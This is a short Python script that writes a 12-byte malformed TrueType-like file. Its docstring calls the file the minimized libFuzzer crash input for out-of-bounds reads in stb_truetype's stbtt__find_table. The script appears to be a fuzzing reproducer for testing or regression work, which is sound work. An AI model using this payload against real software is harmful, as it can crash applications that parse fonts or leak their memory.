#!/usr/bin/env python3
"""Generate a tiny malformed font-like blob that triggers table-directory OOB reads.

This payload is the minimized libFuzzer crash input for stbtt__find_table.
"""

from pathlib import Path

OUT = Path(__file__).with_name("truncated_tabledir.ttf")
PAYLOAD = bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x0A])

OUT.write_bytes(PAYLOAD)
print(f"wrote {OUT} ({len(PAYLOAD)} bytes)")
